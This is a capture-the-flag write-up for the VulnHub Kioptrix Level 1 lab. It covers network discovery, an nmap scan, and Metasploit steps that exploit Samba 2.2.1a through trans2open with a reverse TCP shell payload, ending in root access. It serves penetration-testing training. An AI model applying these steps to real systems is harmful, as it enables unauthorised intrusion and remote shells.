```
Machine: Kioptrix Level 1
Platform: VulnHub
Difficulty: Easy
```

## WALKTHROUGH:
The machine can be found [here](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

### Network Discovery:
Fire up the Kioptrix VM and attacking machine (mine is Kali Linux). Go to the terminal and start the network discovery for your target: **Kioptrix**. 

Use the following command: `sudo arp-scan -l`

![Untitled](https://github.com/user-attachments/assets/5c700e21-b79f-4745-b612-5f233f7f1e05)

Now we have get the IP of the target machine, let's move forward

### Reconnaissance:

Now we will scan the services running on the target ip that is obtained from previous step. For this use nmap command: `sudo nmap -A -sV -sS 192.168.78.131`

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -sV -sS 192.168.78.131
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-27 14:46 EDT
Nmap scan report for 192.168.78.131
Host is up (0.0013s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
|_http-title: 400 Bad Request
|_ssl-date: 2024-07-28T03:46:46+00:00; +9h00m04s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:71:93:25 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 9h00m03s

TRACEROUTE
HOP RTT     ADDRESS
1   1.28 ms 192.168.78.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds
                                                             
```

This shows number of services running on the target including ssh, http, smb, etc.

As per the results obtained, these are the most exploitable services we can use to enter into a system. Now, let's look for a way to enter into the target. 

First I go to the web page as http service is running but we get nothing much and it gives us a default test page.

also I tried to find the hidden directories using dirb directory buster but again no luck!


So, I go back to the nmap scan results and look for other services and their versions. Here I get a good candidate to exploit and that is the smb service, but still there is no version available, so now its the time to use the swiss knife that is our beloved “Metasploit”.

To initiate the msfdb(for first time usage) and fire up the metasploit use the below commands -

msfdb init

msfconsole
Here I searched for the “smb_version” auxiliary module to scan the target and get the running version of the smb service.

search smb_version

metasploit
This returned with available auxiliary scanner module and then I set the target ip to be scanned and run the module-

show options 
set rhsosts <target ip>
run

Metasploit results
it will provide me the version of the Samba service that was — “Samba 2.2.1a”

Now we have got the version, it’s time search for the available exploit to attack on this. For this, I moved to Google and simply search for the exploit for the samba version. I got the result from rapid 7 link with name “trans2open”.


trans2open
Step 3: Exploitation
Now I moved back to metasploit and search for the available exploit for “trans2open”.

search trans2open
There are multiple exploits available, we have to choose for linux, which is on no. 1, so i use the command

use 1
and then set the payload as generic reverse shell tcp -

set payload generic/shell_reverse_tcp

then set the rhosts to our target IP -

set rhosts 192.168.110.128

Then simply run the exploit and voilla!, I get the root shell.


root shell
That’s it for this challenge we have to gain the root access. This can be done in numerous ways, this is one of them.


### Exploitation:

---
## Happy Hacking ;)
---
